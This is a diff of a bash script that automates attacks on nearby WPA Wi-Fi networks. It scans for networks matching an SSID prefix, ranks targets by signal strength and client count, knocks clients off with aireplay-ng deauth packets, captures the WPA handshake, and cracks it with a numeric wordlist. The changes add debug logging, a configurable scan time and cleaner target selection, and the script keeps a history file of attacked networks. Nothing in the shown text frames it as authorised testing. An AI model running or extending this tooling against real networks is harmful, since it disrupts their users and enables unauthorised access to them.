@@ -12,6 +12,15 @@
 # 4. Sends deauth packets to force clients to reauthenticate.
 # 5. Attempts to crack the handshake using a numeric-only wordlist.
 
+# Debug function
+debug() {
+    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+    echo "[DEBUG] [$timestamp] $1" >> debug.log
+    if [ "$VERBOSE" = true ]; then
+        echo "[DEBUG] $1"
+    fi
+}
+
 ##############################################
 # USER-ADJUSTABLE PARAMETERS
 ##############################################
@@ -23,6 +32,8 @@ WORDLIST="8digit.lst"      # Path to the numeric wordlist (must exist)
 CAPTURE_DIR="./captures"   # Directory to store captures
 ETH_IFACE="eth0"          # Ethernet interface name - adjust if different
 HISTORY_FILE="attack_history.txt"  # File to store attack history
+VERBOSE=${VERBOSE:-false}  # Set to true for verbose output
+SCAN_TIME=${SCAN_TIME:-10} # Scan duration in seconds, default 10s
 
 ##############################################
 
@@ -54,93 +65,126 @@ add_to_history() {
     echo "$bssid,$essid,$(date '+%Y-%m-%d %H:%M:%S'),$result" >> "$HISTORY_FILE"
 }
 
-# Function to display network selection menu
+# Function to select target network
 select_target_network() {
     local scan_file=$1
-    local networks=()
+    declare -a networks=()
     local i=1
     
+    debug "Reading scan results from $scan_file"
+    if [ ! -f "$scan_file" ]; then
+        debug "Scan file not found: $scan_file"
+        return 1
+    fi
+    
+    debug "Looking for networks matching prefix: $TARGET_SSID_PREFIX"
     echo
     echo "Available networks matching prefix '$TARGET_SSID_PREFIX':"
     echo "--------------------------------------------------------"
-    echo "ID  ESSID            Channel  Signal  Clients  History"
+    echo "ID  ESSID                  Channel  Signal  Clients  Encryption"
     echo "--------------------------------------------------------"
     
-    while IFS=, read -r bssid first_time pwr beacons data iv channel essid; do
+    # First pass to collect unique networks
+    # Note: Using _ prefix for fields we don't need to avoid invalid variable names
+    while IFS=, read -r bssid first_time pwr beacons data iv channel key _ivsize _lan _ip _id _vendor essid; do
         # Skip header and empty lines
         if [[ "$bssid" =~ ^[[:space:]]*$ ]] || [[ "$bssid" == "BSSID" ]] || [[ "$bssid" =~ "Station MAC" ]]; then
             continue
         fi
         
-        # Only process lines with our target prefix
-        if [[ "$essid" == *"$TARGET_SSID_PREFIX"* ]]; then
-            # Clean up ESSID
-            essid=$(echo "$essid" | tr -d '"' | tr -d ' ')
-            
+        # Clean up ESSID (remove quotes and leading/trailing spaces)
+        essid=$(echo "$essid" | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+        debug "Found network: BSSID=$bssid ESSID=$essid Channel=$channel PWR=$pwr"
+        
+        # Only process lines with our target prefix and valid ESSID
+        if [[ "$essid" == *"$TARGET_SSID_PREFIX"* ]] && [[ ! -z "$essid" ]]; then
+            debug "Network matches target prefix: $essid"
             # Get client count
-            client_count=$(grep -c "$bssid" "$scan_file")
+            client_count=$(grep -c "$bssid" "$scan_file" | grep -v "Station MAC")
             
-            # Check history
-            history_msg="Never attacked"
-            if history_line=$(check_network_history "$bssid"); then
-                last_date=$(echo "$history_line" | cut -d',' -f3)
-                last_result=$(echo "$history_line" | cut -d',' -f4)
-                history_msg="Last: $last_date ($last_result)"
-            fi
-            
-            # Calculate recommendation score (higher is better)
+            # Calculate score (higher is better)
             score=0
-            # Stronger signal (lower PWR is better, PWR is negative)
-            # Convert PWR to positive number first
-            pwr_num=$(echo "$pwr" | tr -d '-')
-            if [[ "$pwr_num" =~ ^[0-9]+$ ]]; then
-                score=$((score + pwr_num))
+            if [[ "$pwr" =~ ^-?[0-9]+$ ]]; then
+                score=$((score + (100 + pwr)))  # Convert signal strength to positive score
             fi
             
-            # More clients is better
             if [[ "$client_count" =~ ^[0-9]+$ ]]; then
                 score=$((score + client_count * 10))
             fi
             
-            # Prefer networks we haven't tried
-            if [ "$history_msg" == "Never attacked" ]; then
-                score=$((score + 50))
-            elif [[ "$history_msg" == *"failed"* ]]; then
-                score=$((score - 30))
-            fi
+            # Store network info
+            networks+=("$bssid,$essid,$channel,$pwr,$client_count,$key,$score")
             
-            networks+=("$bssid,$essid,$channel,$pwr,$client_count,$history_msg,$score")
-            
-            printf "%2d) %-15s %7s %7s %8s  %s\n" $i "$essid" "$channel" "${pwr}dB" "$client_count" "$history_msg"
+            # Display network info
+            printf "%2d) %-20s %7s  %4sdB  %7s  %s\n" \
+                  $i \
+                  "${essid:0:20}" \
+                  "$channel" \
+                  "$pwr" \
+                  "$client_count" \
+                  "$key"
             ((i++))
         fi
     done < "$scan_file"
     
+    if [ ${#networks[@]} -eq 0 ]; then
+        debug "No networks found matching prefix '$TARGET_SSID_PREFIX'"
+        echo "[!] No networks found matching prefix '$TARGET_SSID_PREFIX'"
+        return 1
+    fi
+    
+    debug "Found ${#networks[@]} matching networks"
+    
     # Sort networks by score and show recommendation
     echo
-    echo "Recommendation based on signal strength, client count, and history:"
+    echo "Recommendation based on signal strength and client count:"
     best_network=$(printf '%s\n' "${networks[@]}" | sort -t',' -k7 -nr | head -n1)
     if [ ! -z "$best_network" ]; then
-        IFS=',' read -r bssid essid channel pwr clients history score <<< "$best_network"
+        IFS=',' read -r bssid essid channel pwr clients enc score <<< "$best_network"
         echo "→ $essid (Channel: $channel, Signal: ${pwr}dB, Clients: $clients)"
-        echo "  Reason: Strong signal, active clients, and attack history considered"
+        echo "  Reason: Best combination of signal strength and client activity"
     fi
     
     # Get user selection
     echo
-    read -p "Select network ID to attack (1-$((i-1))) or 'q' to quit: " choice
-    
-    if [[ "$choice" == "q" ]]; then
-        cleanup
-    fi
-    
-    if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -ge "$i" ]; then
-        echo "[!] Invalid selection"
-        cleanup
-    fi
+    while true; do
+        read -p "Select network ID (1-$((i-1))) or 'q' to quit: " choice
+        if [[ "$choice" == "q" ]]; then
+            debug "User chose to quit"
+            cleanup
+        fi
+        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -lt "$i" ]; then
+            break
+        fi
+        echo "[!] Invalid selection. Please enter a number between 1 and $((i-1))"
+    done
     
     # Return the selected network details
+    debug "User selected network $choice"
     echo "${networks[$((choice-1))]}"
+}
+
+# Parse selected network details
+parse_network_selection() {
+    local network_info="$1"
+    if [ -z "$network_info" ]; then
+        echo "[!] No network information provided"
+        return 1
+    fi
+    
+    IFS=',' read -r BSSID ESSID CHANNEL PWR CLIENTS ENC SCORE <<< "$network_info"
+    
+    echo "[*] Selected target network:"
+    echo "  ESSID: $ESSID"
+    echo "  BSSID: $BSSID"
+    echo "  Channel: $CHANNEL"
+    echo "  Signal: ${PWR}dB"
+    echo "  Encryption: $ENC"
+    
+    # Return values in global variables
+    TARGET_ESSID="$ESSID"
+    TARGET_BSSID="$BSSID"
+    TARGET_CHANNEL="$CHANNEL"
 }
 
 # Safety checks for remote connection
@@ -219,8 +263,9 @@ done
 
 # Function to clean up (stop monitor mode) on exit
 cleanup() {
+    debug "Cleaning up: stopping monitor mode"
     echo "[*] Cleaning up: stopping monitor mode."
-    sudo airmon-ng stop $MON_IFACE
+    sudo airmon-ng stop $MON_IFACE 2>/dev/null
     exit
 }
 trap cleanup INT TERM ERR
@@ -256,86 +301,96 @@ echo "[+] Monitor interface: $MON_IFACE"
 IFACE=$MON_IFACE
 
 # Scan for target networks
-echo "[*] Scanning for target networks (60 second scan)..."
-# Remove the timeout and show output directly
-sudo airodump-ng $MON_IFACE --write scan --write-interval 1 --output-format csv &
+echo "[*] Scanning for networks with ESSID prefix '$TARGET_SSID_PREFIX' (${SCAN_TIME}s scan)..."
+debug "Starting airodump-ng scan"
+
+# Run airodump-ng in background and redirect output
+sudo airodump-ng $MON_IFACE --write scan --write-interval 1 --output-format csv > /dev/null 2>&1 &
 SCAN_PID=$!
 
-# Let it run for 60 seconds
-echo "[*] Scanning will run for 60 seconds. Press Ctrl+C to stop early."
-sleep 60
+# Show a progress bar
+for ((i=1; i<=$SCAN_TIME; i++)); do
+    echo -n "."
+    sleep 1
+done
+echo
 
 # Kill the scan process
+debug "Killing scan process $SCAN_PID"
 kill $SCAN_PID 2>/dev/null
 wait $SCAN_PID 2>/dev/null
 
-# Show found networks
-if [ -f scan-01.csv ]; then
-    echo -e "\nFound Networks:"
-    echo "----------------------------------------"
-    echo "BSSID              Channel  Power  ESSID"
-    echo "----------------------------------------"
-    grep -v "^BSSID\|^Station\|^$" scan-01.csv | cut -d',' -f1,4,6,14 | tr ',' ' ' | sort -k3n
-    echo "----------------------------------------"
+# Check if scan file exists
+if [ ! -f "scan-01.csv" ]; then
+    debug "Scan file not created: scan-01.csv"
+    echo "[!] Failed to create scan file"
+    cleanup
 fi
 
-# Retry scan if no results are found
-if [ ! -f scan-01.csv ] || ! grep -q "$TARGET_SSID_PREFIX" scan-01.csv; then
-    echo "[!] No target networks found. Retrying scan with increased timeout..."
-    sudo timeout 30 airodump-ng $MON_IFACE --write scan --write-interval 1 --output-format csv > /dev/null 2>&1
-    if [ ! -f scan-01.csv ] || ! grep -q "$TARGET_SSID_PREFIX" scan-01.csv; then
-        echo "[!] No target networks found after retrying. Exiting."
-        cleanup
-    fi
-fi
-
+debug "Processing scan results"
 # After scan completion, show menu and get selection
-NETWORK_CHOICE=$(select_target_network "scan-01.csv")
-if [ -z "$NETWORK_CHOICE" ]; then
+NETWORK_INFO=$(select_target_network "scan-01.csv")
+if [ -z "$NETWORK_INFO" ]; then
+    debug "No network selected or no networks found"
     echo "[!] No network selected"
     cleanup
 fi
 
-# Parse selected network details
-BSSID=$(echo "$NETWORK_CHOICE" | cut -d',' -f1)
-ESSID=$(echo "$NETWORK_CHOICE" | cut -d',' -f2)
-CHANNEL=$(echo "$NETWORK_CHOICE" | cut -d',' -f3)
+# Parse the selected network info
+parse_network_selection "$NETWORK_INFO"
+if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
+    echo "[!] Failed to parse network information"
+    cleanup
+fi
 
-echo "[*] Selected target: ESSID=$ESSID, BSSID=$BSSID, Channel=$CHANNEL"
+echo "[*] Starting attack on $TARGET_ESSID"
+debug "Starting handshake capture for BSSID: $TARGET_BSSID Channel: $TARGET_CHANNEL"
 
 # Start capturing handshakes
-CAP_FILE="$CAPTURE_DIR/${ESSID}_capture"
+CAP_FILE="$CAPTURE_DIR/${TARGET_ESSID}_capture"
 echo "[*] Starting airodump-ng on the target network to capture handshake..."
-sudo airodump-ng --bssid $BSSID --channel $CHANNEL --write $CAP_FILE --write-interval 1 --output-format cap,csv $MON_IFACE &
+sudo airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write $CAP_FILE \
+    --write-interval 1 --output-format cap,csv $MON_IFACE > /dev/null 2>&1 &
 AIRODUMP_PID=$!
 
-sleep 5 # Allow time for airodump-ng to start
+sleep 2  # Give airodump time to start
 
 # Send deauth packets
 echo "[*] Sending deauth packets to force handshake capture..."
-if ! sudo aireplay-ng --deauth 20 -a $BSSID $MON_IFACE; then
+debug "Sending deauth packets to BSSID: $TARGET_BSSID"
+if ! sudo aireplay-ng --deauth 20 -a $TARGET_BSSID $MON_IFACE 2>/dev/null; then
+    debug "Failed to send deauth packets"
     echo "[!] Warning: Failed to send deauth packets. Capture may not contain a handshake."
 fi
 
 # Wait for handshake capture
 echo "[*] Waiting for handshake capture (15 seconds)..."
 for i in {1..15}; do
-    sleep 1
     echo -n "."
+    sleep 1
 done
 echo
 
 # Stop airodump-ng
-sudo kill $AIRODUMP_PID
+debug "Stopping airodump-ng (PID: $AIRODUMP_PID)"
+sudo kill $AIRODUMP_PID 2>/dev/null
 wait $AIRODUMP_PID 2>/dev/null
 
 # Validate handshake capture
-if ! aircrack-ng "${CAP_FILE}-01.cap" | grep -q "handshake"; then
-    echo "[!] No WPA handshake detected in ${CAP_FILE}-01.cap. Review the file manually if needed."
+if [ -f "${CAP_FILE}-01.cap" ]; then
+    debug "Checking for handshake in ${CAP_FILE}-01.cap"
+    if ! aircrack-ng "${CAP_FILE}-01.cap" 2>&1 | grep -q "handshake"; then
+        debug "No handshake found in capture file"
+        echo "[!] No WPA handshake detected in ${CAP_FILE}-01.cap"
+        cleanup
+    fi
+    debug "Handshake found in capture file"
+    echo "[+] Handshake captured successfully!"
+else
+    debug "Capture file not found: ${CAP_FILE}-01.cap"
+    echo "[!] Capture file not found"
     cleanup
 fi
-
-echo "[*] Handshake captured in ${CAP_FILE}-01.cap."
 
 # Attempt to crack the handshake
 if [ ! -f "$WORDLIST" ]; then
